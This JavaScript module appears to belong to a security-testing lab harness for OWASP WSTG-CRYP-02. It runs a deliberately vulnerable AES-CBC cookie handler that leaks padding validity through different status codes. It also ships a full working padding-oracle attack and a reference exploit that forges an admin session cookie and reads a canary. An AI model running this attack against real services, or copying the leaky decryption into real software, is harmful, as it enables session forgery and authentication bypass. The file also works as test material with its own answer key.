// WSTG-CRYP-02 (4.9.2) — Padding Oracle behaviour.
// Auth cookie = base64url( IV(16) || AES-256-CBC-PKCS7(username) ). The handler
// decrypts and leaks padding validity: padding-invalid -> 400, padding-valid
// -> 200 (the side channel). An attacker recovers the ciphertext block's
// intermediate state via the oracle and sets a forged IV so the block decrypts
// to the admin username — CBC bit-flipping, no key needed.

import crypto from 'node:crypto'
import { Scenario } from './scenario.mjs'

const ALG = 'aes-256-cbc'
const BS = 16
// Per-deploy (per-process) random key. Never leaves the server.
const KEY = crypto.randomBytes(32)

function pkcs7(buf, bs = BS) {
  const pad = bs - (buf.length % bs)
  return Buffer.concat([buf, Buffer.alloc(pad, pad)])
}

function issueToken(user) {
  const iv = crypto.randomBytes(BS)
  const c = crypto.createCipheriv(ALG, KEY, iv)
  const ct = Buffer.concat([c.update(user, 'utf8'), c.final()])
  return Buffer.concat([iv, ct]).toString('base64url')
}

// Decrypt with PKCS7 validation. Returns { ok, user } on valid padding, or
// { ok:false } on invalid padding / malformed input. The ok flag IS the oracle.
function tryDecrypt(token) {
  let raw
  try { raw = Buffer.from(String(token), 'base64url') } catch { return { ok: false } }
  if (raw.length < 2 * BS || raw.length % BS !== 0) return { ok: false, malformed: true }
  const iv = raw.subarray(0, BS)
  const ct = raw.subarray(BS)
  try {
    const d = crypto.createDecipheriv(ALG, KEY, iv) // autoPadding on -> final() throws on bad padding
    const pt = Buffer.concat([d.update(ct), d.final()])
    return { ok: true, user: pt.toString('utf8') }
  } catch {
    return { ok: false } // padding invalid
  }
}

function getCookie(req, name) {
  const c = (req.headers.cookie || '').split(';').map(s => s.trim()).find(s => s.startsWith(name + '='))
  return c ? c.slice(name.length + 1) : null
}

// Recover the intermediate state I = D(targetBlock) using the padding oracle.
// query(ivBuf) resolves true iff base64url(ivBuf || targetBlock) has valid padding.
export async function recoverIntermediate(targetBlock, query, concurrency = 32) {
  const I = Buffer.alloc(BS)
  for (let pad = 1; pad <= BS; pad++) {
    const pos = BS - pad
    const suffix = Buffer.alloc(BS)
    for (let k = pos + 1; k < BS; k++) suffix[k] = I[k] ^ pad
    const valids = []
    for (let start = 0; start < 256; start += concurrency) {
      const batch = []
      for (let g = start; g < Math.min(start + concurrency, 256); g++) {
        const iv = Buffer.from(suffix)
        iv[pos] = g
        batch.push(query(iv).then(ok => (ok ? g : -1)))
      }
      for (const g of await Promise.all(batch)) if (g >= 0) valids.push(g)
    }
    let chosen = -1
    if (pad === 1 && valids.length > 1) {
      // Disambiguate a real 0x01 from a coincidental 0x02 0x02… by perturbing the
      // preceding byte; the true single-byte padding stays valid.
      for (const g of valids) {
        const iv = Buffer.from(suffix)
        iv[pos] = g
        iv[pos - 1] ^= 0xff
        if (await query(iv)) { chosen = g; break }
      }
      if (chosen < 0) chosen = valids[0]
    } else {
      chosen = valids.length ? valids[0] : -1
    }
    if (chosen < 0) throw new Error(`padding oracle: no valid byte at position ${pos}`)
    I[pos] = chosen ^ pad
  }
  return I
}

export const classDef = {
  wstgId: 'WSTG-CRYP-02',
  class: 'Padding Oracle',
  defenceTiers: [0],
  Scenario,
  needsSignup: false,
  canaryRuntime: true,
  discoveryMode: 'observation',
  discoveryTargetPath: (s) => s.basePath,
  discoveryStaticOk: (s) =>
    typeof s.chromeInjection?.html === 'string' && s.chromeInjection.html.includes(s.basePath),

  matchesRequest({ reqUrl, scenario }) {
    return reqUrl.pathname === scenario.basePath
  },

  async handleRequest({ req, scenario, renderPage, manifest }) {
    const auth = getCookie(req, 'auth')
    // First visit: issue a guest session token.
    if (!auth) {
      const token = issueToken('guest')
      return {
        status: 200,
        headers: { 'Content-Type': 'text/html; charset=utf-8', 'Set-Cookie': `auth=${token}; Path=/` },
        body: renderPage(scenario.memberBody.replaceAll('{USER}', 'guest')),
      }
    }
    const res = tryDecrypt(auth)
    // VULNERABLE: padding validity leaks via the response — invalid padding gets
    // a distinct status from valid padding (a real app gives only ok/failed).
    if (!res.ok) {
      return { status: 400, body: renderPage('<p role="alert">Invalid session token.</p>') }
    }
    if (res.user === scenario.adminUsername) {
      return { status: 200, body: renderPage(scenario.adminBody.replace('{CANARY}', manifest.perDeployCanary)) }
    }
    return { status: 200, body: renderPage(scenario.memberBody.replaceAll('{USER}', escapeHtml(res.user))) }
  },

  // Reference exploit: take the guest token's ciphertext block, recover its
  // intermediate via the oracle, then forge IV' = I ⊕ PKCS7(admin) so the block
  // decrypts to the admin username. Read the dashboard canary.
  async fireExploit({ baseUrl, scenario, payload, helpers }) {
    const base = scenario.basePath
    const sleep = (ms) => new Promise(res => setTimeout(res, ms))
    // The oracle attack fires thousands of requests; tolerate transient network
    // drops (ECONNRESET / socket hang up) by retrying each request rather than
    // letting one failure abort the whole attack.
    const fetchResilient = async (opts) => {
      let lastErr
      for (let attempt = 0; attempt < 6; attempt++) {
        try {
          const r = await fetch(`${baseUrl}${base}`, { redirect: 'manual', ...opts })
          await r.text()
          return r
        } catch (e) { lastErr = e; await sleep(100 * (attempt + 1)) }
      }
      throw lastErr
    }

    const r0 = await fetchResilient({})
    const m = (r0.headers.get('set-cookie') || '').match(/auth=([^;]+)/)
    if (!m) return { status: 0, body: 'no session cookie issued' }
    const raw = Buffer.from(m[1], 'base64url')
    if (raw.length !== 2 * BS) return { status: 0, body: `unexpected token length ${raw.length}` }
    const C1 = raw.subarray(BS, 2 * BS)

    const query = async (ivBuf) => {
      const token = Buffer.concat([ivBuf, C1]).toString('base64url')
      const r = await fetchResilient({ headers: { Cookie: `auth=${token}`, Connection: 'keep-alive' } })
      return r.status === 200
    }

    const I = await recoverIntermediate(C1, query, 16)
    const P = pkcs7(Buffer.from(String(payload), 'utf8'))
    const ivForge = Buffer.alloc(BS)
    for (let i = 0; i < BS; i++) ivForge[i] = I[i] ^ P[i]
    const forged = Buffer.concat([ivForge, C1]).toString('base64url')
    return helpers.fetchWithCookie(`${baseUrl}${base}`, `auth=${forged}`)
  },

  exploitSuccessCriterion: ({ responseBody, perDeployCanary }) =>
    responseBody.includes(perDeployCanary),
}

// Exposed for the in-process self-test (uses the same module KEY).
export const __test = { issueToken, tryDecrypt, pkcs7, BS }

function escapeHtml(s) {
  return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
}
